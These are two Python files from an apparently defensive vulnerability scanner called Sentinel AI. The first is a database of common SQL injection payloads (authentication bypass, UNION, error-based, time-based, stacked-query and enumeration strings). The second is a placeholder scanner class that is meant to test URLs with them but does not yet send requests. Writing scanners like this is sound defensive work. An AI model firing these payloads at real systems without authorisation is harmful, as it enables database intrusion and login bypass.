"""
===========================================================
Project : Sentinel AI
Module  : SQL Injection Payload Database
File ID : SCANNER-SQL-PAYLOAD-001
Version : 1.0.0
===========================================================

Description:
Common SQL Injection payloads used by SentinelAI.

===========================================================
"""

from __future__ import annotations

from app.database.models.finding import Finding

# ===========================================================
# Authentication Bypass
# ===========================================================

AUTH_BYPASS_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 'a'='a",
    "admin'--",
    "admin'#",
    "' OR ''='",
]

# ===========================================================
# Boolean Based
# ===========================================================

BOOLEAN_PAYLOADS = [
    "' AND 1=1--",
    "' AND 1=2--",
    '" AND 1=1--',
    '" AND 1=2--',
    "') AND ('1'='1",
    "') AND ('1'='2",
]

# ===========================================================
# UNION Based
# ===========================================================

UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
]

# ===========================================================
# Error Based
# ===========================================================

ERROR_PAYLOADS = [
    "'",
    '"',
    "')",
    '" )',
    "' OR updatexml(1,concat(0x7e,user()),1)--",
    "' OR extractvalue(1,concat(0x7e,user()))--",
]

# ===========================================================
# Time Based
# ===========================================================

TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    '" OR SLEEP(5)--',
]

# ===========================================================
# Stacked Queries
# ===========================================================

STACKED_PAYLOADS = [
    "'; SELECT @@version--",
    "'; SELECT user()--",
    "'; SELECT database()--",
    "'; SELECT current_user--",
]

# ===========================================================
# Database Enumeration
# ===========================================================

ENUMERATION_PAYLOADS = [
    "' UNION SELECT database()--",
    "' UNION SELECT user()--",
    "' UNION SELECT version()--",
    "' UNION SELECT @@version--",
    "' UNION SELECT current_database()--",
]

# ===========================================================
# URL Encoded
# ===========================================================

ENCODED_PAYLOADS = [
    "%27%20OR%201%3D1--",
    "%22%20OR%201%3D1--",
    "%27%20UNION%20SELECT%20NULL--",
]

# ===========================================================
# Database Specific
# ===========================================================

MYSQL_PAYLOADS = [
    "' OR SLEEP(5)--",
    "' UNION SELECT @@version--",
    "' UNION SELECT database()--",
]

POSTGRES_PAYLOADS = [
    "'; SELECT version()--",
    "'; SELECT current_database()--",
    "'; SELECT pg_sleep(5)--",
]

MSSQL_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",
    "' UNION SELECT @@version--",
]

ORACLE_PAYLOADS = [
    "' UNION SELECT banner FROM v$version--",
]

# ===========================================================
# Combined Payload List
# ===========================================================

ALL_SQL_PAYLOADS = (
    AUTH_BYPASS_PAYLOADS
    + BOOLEAN_PAYLOADS
    + UNION_PAYLOADS
    + ERROR_PAYLOADS
    + TIME_PAYLOADS
    + STACKED_PAYLOADS
    + ENUMERATION_PAYLOADS
    + ENCODED_PAYLOADS
    + MYSQL_PAYLOADS
    + POSTGRES_PAYLOADS
    + MSSQL_PAYLOADS
    + ORACLE_PAYLOADS
)

# ===========================================================
# Helper
# ===========================================================


def get_payloads() -> list[str]:
    """
    Return all SQL Injection payloads.
    """

    return list(dict.fromkeys(ALL_SQL_PAYLOADS))


# ===========================================================
# Temporary Test
# ===========================================================

if __name__ == "__main__":
    print("=" * 60)
    print("SentinelAI SQL Injection Payload Database")
    print("=" * 60)

    payloads = get_payloads()

    print(f"Total Payloads : {len(payloads)}")
"""
===========================================================
Project : Sentinel AI
Module  : SQL Injection Scanner
File ID : SCANNER-SQLI-001
Version : 1.0.0
===========================================================

Description:
SQL Injection Scanner.

===========================================================
"""


class SQLiScanner:
    """
    Detect SQL Injection vulnerabilities.
    """

    def __init__(self) -> None:

        self.name = "SQL Injection"

        self.severity = "Critical"

        self.payloads = get_payloads()

    # =====================================================
    # Scan
    # =====================================================

    def scan(
        self,
        project_id: str,
        url: str,
    ) -> Finding | None:
        """
        Scan a single URL.

        Returns
        -------
        Finding
            Vulnerability if detected.

        None
            No vulnerability found.
        """

        print(f"[SQLi] Scanning -> {url}")

        # -------------------------------------------------
        # Placeholder
        # Real HTTP requests will be implemented later.
        # -------------------------------------------------

        vulnerable = False

        detected_payload = ""

        for payload in self.payloads:
            # Future:
            # Inject payload into parameters
            # Send request
            # Compare responses

            if False:
                vulnerable = True

                detected_payload = payload

                break

        if not vulnerable:
            return None

        # -------------------------------------------------
        # Create Finding
        # -------------------------------------------------

        return Finding(
            project_id=project_id,
            title="SQL Injection",
            description=("Potential SQL Injection vulnerability detected."),
            severity=self.severity,
            cvss=9.8,
            status="Open",
            module="SQLi Scanner",
            target=url,
            url=url,
            parameter="",
            payload=detected_payload,
            evidence="",
            recommendation=("Use parameterized queries and prepared statements."),
            reference=("https://owasp.org/www-community/attacks/SQL_Injection"),
            cwe="CWE-89",
            owasp="A03:2021 Injection",
            cve="",
        )

    # =====================================================
    # Scanner Information
    # =====================================================

    def info(
        self,
    ) -> dict:

        return {
            "name": self.name,
            "severity": self.severity,
            "payloads": len(self.payloads),
            "type": "Active Scanner",
        }


# ============================================================
# Temporary Test
# ============================================================

if __name__ == "__main__":
    scanner = SQLiScanner()

    result = scanner.scan(
        project_id="demo-project",
        url="https://example.com/login.php?id=1",
    )

    print()

    if result is None:
        print("No SQL Injection Found")

    else:
        print(result)
